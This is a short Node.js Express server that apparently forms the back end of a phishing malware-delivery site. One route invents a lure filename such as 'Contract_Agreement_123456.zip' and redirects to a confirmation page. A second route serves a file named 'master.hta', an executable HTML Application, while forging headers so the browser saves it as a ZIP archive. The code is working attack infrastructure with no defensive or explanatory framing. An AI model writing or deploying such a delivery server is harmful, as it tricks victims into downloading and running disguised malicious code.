const express = require('express');
const path = require('path');
const crypto = require('crypto');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.static('public'));

// The Bridge: Generates a unique ZIP name and redirects to confirm.html
app.get('/bridge', (req, res) => {
    const randomId = crypto.randomInt(100000, 999999);
    const uniqueZip = `Contract_Agreement_${randomId}.zip`;
    res.redirect(`/confirm.html?zip=${uniqueZip}`);
});

// The Payload Endpoint: Serves the master.hta but names it as a ZIP
// Note: Browsers will save it as a ZIP because of the Content-Disposition header
app.get('/payload/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'payload', 'master.hta');
    
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/zip');
    res.sendFile(filePath);
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
